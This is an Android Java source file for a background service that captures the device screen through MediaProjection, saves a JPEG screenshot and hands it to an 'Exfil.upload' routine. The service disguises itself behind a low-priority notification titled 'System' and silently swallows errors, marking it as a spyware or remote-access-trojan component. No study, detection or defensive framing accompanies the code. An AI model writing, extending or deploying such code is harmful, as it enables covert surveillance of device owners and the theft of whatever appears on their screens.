package com.vanta.core;

import android.app.*;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.*;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.*;
import android.os.*;
import android.util.DisplayMetrics;
import java.io.*;

public class ScreenService extends Service {
    private MediaProjection mp;

    @Override
    public int onStartCommand(Intent i, int f, int s) {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel("scr", "Screen", NotificationManager.IMPORTANCE_MIN);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
            startForeground(2, new Notification.Builder(this, "scr")
                .setContentTitle("System")
                .setSmallIcon(android.R.drawable.ic_menu_camera).build());
        }

        MediaProjectionManager m = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        mp = m.getMediaProjection(i.getIntExtra("code", 0), (Intent) i.getParcelableExtra("data"));
        if (mp == null) { stopSelf(); return START_NOT_STICKY; }

        final DisplayMetrics dm = getResources().getDisplayMetrics();
        final ImageReader reader = ImageReader.newInstance(dm.widthPixels, dm.heightPixels, PixelFormat.RGBA_8888, 2);

        mp.createVirtualDisplay("scr", dm.widthPixels, dm.heightPixels, dm.density,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader.getSurface(), null, null);

        new Handler().postDelayed(new Runnable() {
            public void run() {
                Image img = reader.acquireLatestImage();
                if (img == null) { stopSelf(); return; }
                try {
                    Image.Plane p = img.getPlanes()[0];
                    Bitmap bmp = Bitmap.createBitmap(dm.widthPixels, dm.heightPixels, Bitmap.Config.ARGB_8888);
                    bmp.copyPixelsFromBuffer(p.getBuffer());
                    File f = new File(getExternalFilesDir(null), "shot_" + System.currentTimeMillis() + ".jpg");
                    FileOutputStream fos = new FileOutputStream(f);
                    bmp.compress(Bitmap.CompressFormat.JPEG, 75, fos);
                    fos.close();
                    Exfil.upload(f.getAbsolutePath());
                } catch (Exception e) {} finally { img.close(); }
                stopSelf();
            }
        }, 800);

        return START_NOT_STICKY;
    }

    @Override public IBinder onBind(Intent i) { return null; }
                  }
